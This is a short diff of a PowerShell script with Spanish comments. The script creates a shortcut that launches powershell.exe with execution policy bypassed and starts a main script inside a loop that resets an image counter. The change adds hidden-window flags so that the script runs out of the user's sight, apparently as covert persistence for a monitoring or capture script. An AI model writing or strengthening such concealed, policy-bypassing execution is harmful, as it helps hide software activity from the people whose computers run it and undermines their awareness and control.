@@ -40,11 +40,11 @@ do {
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($shortcutLocation)
         $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$syswPath`""
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
         $shortcut.Save()
         
-        # Ejecutar el script principal
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$syswPath`"" -WindowStyle Hidden
+        # Ejecutar el script principal de manera oculta
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
         
         # Reiniciar contador de imágenes
         $a = 0
